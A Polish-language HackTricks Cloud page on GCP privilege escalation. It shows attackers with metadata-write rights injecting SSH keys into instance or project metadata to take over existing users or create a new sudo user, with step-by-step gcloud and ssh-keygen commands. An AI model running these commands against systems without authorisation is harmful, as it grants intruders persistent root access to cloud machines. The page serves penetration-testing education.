# GCP - Dodaj niestandardowe metadane SSH

## GCP - Dodaj niestandardowe metadane SSH

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ sztuczkami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w na githubie.

</details>
{% endhint %}

### Modyfikacja metadanych <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

Modyfikacja metadanych na instancji moÅ¼e prowadziÄ‡ do **znaczÄ…cych zagroÅ¼eÅ„ bezpieczeÅ„stwa, jeÅ›li atakujÄ…cy zdobÄ™dzie niezbÄ™dne uprawnienia**.

#### **WÅ‚Ä…czenie kluczy SSH do niestandardowych metadanych**

Na GCP, **systemy Linux** czÄ™sto wykonujÄ… skrypty z [Python Linux Guest Environment for Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts). Krytycznym elementem tego jest [demon konta](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts), ktÃ³ry jest zaprojektowany do **regularnego sprawdzania** punktu koÅ„cowego metadanych instancji w poszukiwaniu **aktualizacji autoryzowanych kluczy publicznych SSH**.

Dlatego, jeÅ›li atakujÄ…cy moÅ¼e modyfikowaÄ‡ niestandardowe metadane, moÅ¼e sprawiÄ‡, Å¼e demon znajdzie nowy klucz publiczny, ktÃ³ry zostanie przetworzony i **zintegrowany z lokalnym systemem**. Klucz zostanie dodany do pliku `~/.ssh/authorized_keys` **istniejÄ…cego uÅ¼ytkownika lub potencjalnie stworzy nowego uÅ¼ytkownika z uprawnieniami `sudo`**, w zaleÅ¼noÅ›ci od formatu klucza. A atakujÄ…cy bÄ™dzie mÃ³gÅ‚ przejÄ…Ä‡ kontrolÄ™ nad hostem.

#### **Dodaj klucz SSH do istniejÄ…cego uÅ¼ytkownika z uprawnieniami**

1. **Zbadaj istniejÄ…ce klucze SSH na instancji:**
*   Wykonaj polecenie, aby opisaÄ‡ instancjÄ™ i jej metadane, aby zlokalizowaÄ‡ istniejÄ…ce klucze SSH. Odpowiednia sekcja w wynikach bÄ™dzie pod `metadata`, a konkretnie kluczem `ssh-keys`.

```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
* ZwrÃ³Ä‡ uwagÄ™ na format kluczy SSH: nazwa uÅ¼ytkownika poprzedza klucz, oddzielona dwukropkiem.
2. **Przygotuj plik tekstowy dla metadanych klucza SSH:**
* Zapisz szczegÃ³Å‚y nazw uÅ¼ytkownikÃ³w i ich odpowiadajÄ…cych kluczy SSH w pliku tekstowym o nazwie `meta.txt`. To jest istotne dla zachowania istniejÄ…cych kluczy podczas dodawania nowych.
3. **Wygeneruj nowy klucz SSH dla docelowego uÅ¼ytkownika (`alice` w tym przykÅ‚adzie):**
*   UÅ¼yj polecenia `ssh-keygen`, aby wygenerowaÄ‡ nowy klucz SSH, upewniajÄ…c siÄ™, Å¼e pole komentarza (`-C`) odpowiada docelowej nazwie uÅ¼ytkownika.

```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
* Dodaj nowy klucz publiczny do `meta.txt`, naÅ›ladujÄ…c format znaleziony w metadanych instancji.
4. **Zaktualizuj metadane klucza SSH instancji:**
*   Zastosuj zaktualizowane metadane klucza SSH do instancji, uÅ¼ywajÄ…c polecenia `gcloud compute instances add-metadata`.

```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```
5. **Uzyskaj dostÄ™p do instancji za pomocÄ… nowego klucza SSH:**
*   PoÅ‚Ä…cz siÄ™ z instancjÄ… za pomocÄ… SSH, uÅ¼ywajÄ…c nowego klucza, uzyskujÄ…c dostÄ™p do powÅ‚oki w kontekÅ›cie docelowego uÅ¼ytkownika (`alice` w tym przykÅ‚adzie).

```bash
ssh -i ./key alice@localhost
sudo id
```

#### **UtwÃ³rz nowego uÅ¼ytkownika z uprawnieniami i dodaj klucz SSH**

JeÅ›li nie znaleziono interesujÄ…cego uÅ¼ytkownika, moÅ¼na utworzyÄ‡ nowego, ktÃ³remu nadane zostanÄ… uprawnienia `sudo`:
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
#### Klucze SSH na poziomie projektu <a href="#sshing-around" id="sshing-around"></a>

MoÅ¼liwe jest rozszerzenie zasiÄ™gu dostÄ™pu SSH do wielu maszyn wirtualnych (VM) w Å›rodowisku chmurowym poprzez **zastosowanie kluczy SSH na poziomie projektu**. To podejÅ›cie umoÅ¼liwia dostÄ™p SSH do kaÅ¼dej instancji w projekcie, ktÃ³ra nie zablokowaÅ‚a wyraÅºnie kluczy SSH na poziomie projektu. Oto podsumowany przewodnik:

1. **Zastosuj klucze SSH na poziomie projektu:**
*   UÅ¼yj polecenia `gcloud compute project-info add-metadata`, aby dodaÄ‡ klucze SSH z `meta.txt` do metadanych projektu. Ta akcja zapewnia, Å¼e klucze SSH sÄ… rozpoznawane we wszystkich VM w projekcie, chyba Å¼e VM ma wÅ‚Ä…czonÄ… opcjÄ™ "Zablokuj klucze SSH na poziomie projektu".

```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```
2. **SSH do instancji za pomocÄ… kluczy na poziomie projektu:**
* Z kluczami SSH na poziomie projektu moÅ¼esz SSH do dowolnej instancji w projekcie. Instancje, ktÃ³re nie blokujÄ… kluczy na poziomie projektu, zaakceptujÄ… klucz SSH, przyznajÄ…c dostÄ™p.
* BezpoÅ›redniÄ… metodÄ… na SSH do instancji jest uÅ¼ycie polecenia `gcloud compute ssh [INSTANCE]`. To polecenie uÅ¼ywa twojej bieÅ¼Ä…cej nazwy uÅ¼ytkownika i kluczy SSH ustawionych na poziomie projektu, aby sprÃ³bowaÄ‡ uzyskaÄ‡ dostÄ™p.

## Odniesienia

* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel siÄ™ sztuczkami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
{% endhint %}
